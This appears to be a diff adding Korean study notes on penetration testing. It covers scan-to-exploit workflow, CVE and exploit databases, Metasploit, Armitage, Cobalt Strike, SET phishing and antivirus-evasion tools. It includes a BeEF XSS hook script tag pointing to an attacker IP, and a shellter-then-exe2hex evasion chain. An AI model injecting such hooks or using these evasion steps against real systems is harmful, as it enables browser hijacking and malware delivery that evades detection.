@@ -1,0 +1,62 @@
+포트스캔 -> port -> service -> process 
+
+	응용 프로그램의 header 정보가 나오면 그 정보를 통해 각 응용프로그램의 버전 정보를 알수 있다.
+	버전 정보가 나오면 그 버전 별 알려진 취약점 리스트 확보할 수 있고.
+	그걸 통해 exploit 을 진행
+	CVE
+	https://www.cvedetails.com/
+
+	CWE
+
+	MS
+	https://www.beyondtrust.com/resources/whitepapers/microsoft-vulnerability-report
+
+
+
+	exploit  site
+	https://www.exploit-db.com/
+	
+
+metasploit framework
+	- 공격의 목록화 공격의 자동화 리스너 를 제공함으로 
+	- opensource  -> backtrack  환경에서 기본으로 제공 -> kali -> rapid7 
+	
+armitage
+	- 스캔 부터 exploit 까지 한번 자동화 하여 공격 하는 공격 자동화 환경
+
+cobalt strike 
+	- 스캔 부터 exploit 까지 한번 자동화 하여 공격 하는 공격 자동화 환경  
+	- 유료 버전이고  일부 온라인에서 크랙되어 있는 부분이 있지만   설치 난이도가 높다.
+
+
+응용프로그램 분석   fuzzing   ,  리버싱 , EXPLOIT 제작  =  취약점 제보 
+
+
+
+사회 공학적 기법 
+
+	XSS framework BeEf
+	https://beefproject.com/ 
+	-  커스텀 통해 metasploit  붙일 수 있음 
+	<script src="http://192.168.100.147:3000/hook.js"></script>
+	SET  framework
+	- 피싱 사이트 만들기 , 허니팟 구성, QR 코드 
+
+
+바이너리 변환
+
+	
+	shellter project 
+	https://www.shellterproject.com/download/
+	- 바이너리 난독화 도구 
+	exe2hex  
+	- 포맷 변환 도구 ( 바이너리 포맷변환, bat , powershell )
+
+
+	exe -> bat, powershell
+	
+	exe -> shellter (anti virus = 백신  우회) -> exe2hex
+	
+	
+
+	
